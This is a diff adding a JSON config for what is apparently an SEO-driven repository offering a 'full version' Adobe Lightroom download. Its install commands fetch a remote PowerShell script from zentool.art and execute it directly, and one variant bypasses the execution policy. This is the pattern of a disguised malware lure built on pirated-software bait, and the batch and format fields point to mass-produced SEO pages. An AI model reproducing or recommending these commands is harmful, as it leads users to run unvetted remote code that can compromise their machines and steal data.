@@ -1,0 +1,33 @@
+{
+  "repo": "Adobe-Lightroom-Full-Version-Setup",
+  "product": "Adobe-Lightroom-Full-Version-Setup",
+  "product_title": "Adobe Lightroom",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_url": "https://zentool.art/",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "health_url": "https://zentool.art/health",
+  "batch": "fat-seo-no-year",
+  "format": "license-md-geogit-v5-paraphrase-seo",
+  "tone": "guide",
+  "category": "utility",
+  "topics": [
+    "adobe-lightroom",
+    "lightroom-full-version",
+    "photo-editing",
+    "raw-develop",
+    "catalog-management",
+    "preset-workflow",
+    "color-grading",
+    "batch-export",
+    "photography",
+    "lightroom-classic",
+    "complete-version",
+    "download",
+    "full-installer",
+    "windows-11",
+    "windows-software"
+  ],
+  "site": "zentool.art"
+}
